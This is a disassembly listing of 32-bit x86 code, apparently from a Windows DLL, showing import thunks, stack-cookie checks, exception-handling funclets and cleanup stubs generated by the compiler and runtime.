mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10014c24
call eax
retn
memset
jmp [ memset@IAT ]
_purecall
jmp [ _purecall@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
sub_10014de0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10014ee0
sub_10014df6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10014ee0
sub_10014eb2
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10014e0c
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_initterm
jmp [ _initterm@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
sub_10014f5d
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
_except_handler3
jmp [ _except_handler3@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10014fc8
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10014571
jmp sub_10015025
sub_10015025
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001503c
jmp _ftol
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_1001516b
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001517f
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10014571
jmp sub_1001516b
_ftol
jmp [ _ftol@IAT ]
sub_10015194
lea eax [ ebp - 0x38 ]
jmp sub_100106c1
sub_1001519c
lea eax [ ebp - 0x3c ]
jmp sub_100106c1
sub_100151a4
lea eax [ ebp - 0x48 ]
jmp sub_100106c1
sub_100151ac
lea eax [ ebp - 0x4c ]
jmp sub_100106c1
sub_100151b4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10014571
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_100151d9
push [ ebp - 0x21c ]
call [ operator delete@IAT ]
pop ecx
retn
sub_100151e7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x220 ]
xor ecx eax
call sub_10014571
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_1001520f
push [ ebp - 0xa2c ]
call [ operator delete@IAT ]
pop ecx
retn
sub_1001521d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa34 ]
mov ecx [ edx - 0xa38 ]
xor ecx eax
call sub_10014571
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_1001524b
mov ecx [ ebp - 0x10 ]
jmp sub_10003802
sub_10015253
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_10005781
sub_1001525e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_10015279
mov ecx [ ebp - 0x10 ]
jmp sub_10003802
sub_10015281
mov esi [ ebp - 0x10 ]
add esi 0x8
jmp sub_100091b9
sub_1001528c
mov esi [ ebp - 0x10 ]
add esi 0x2074
jmp sub_100091dc
sub_1001529a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_100152b5
mov ecx [ ebp + 0x8 ]
jmp sub_10003802
sub_100152bd
mov esi [ ebp + 0x8 ]
add esi 0x8
jmp sub_100091b9
sub_100152c8
mov esi [ ebp + 0x8 ]
add esi 0x2074
jmp sub_100091dc
sub_100152d6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_100152f1
push [ ebp - 0x10 ]
call [ operator delete@IAT ]
pop ecx
retn
sub_100152fc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
sub_10015317
push [ ebp - 0x74 ]
call [ operator delete@IAT ]
pop ecx
retn
sub_10015322
push [ ebp - 0x74 ]
call [ operator delete@IAT ]
pop ecx
retn
sub_1001532d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_10014571
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10014571
mov eax r--data
jmp __CxxFrameHandler
